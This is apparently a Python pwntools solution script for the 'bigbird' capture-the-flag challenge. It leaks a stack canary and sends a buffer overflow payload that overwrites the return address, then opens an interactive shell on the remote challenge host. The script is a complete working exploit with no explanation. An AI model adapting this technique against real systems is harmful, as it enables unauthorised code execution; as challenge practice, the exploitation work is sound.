#!/usr/bin/env python3

from pwn import *

exe = ELF("./bigbird_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("bigbird.challs.olicyber.it", 12006)

    return r


def main():
    r = conn()


    canary = r.recvline().split()[-1]
    canary = p64(int(canary, 16))

    r.recvuntil(b"https://www.youtube.com/watch?v=9Gc4QTqslN4")
    
    print(canary)
    
    r.sendline(b"A" * 40 + canary + b"A"*8 + p64(0x401715))

    r.interactive()


if __name__ == "__main__":
    main()
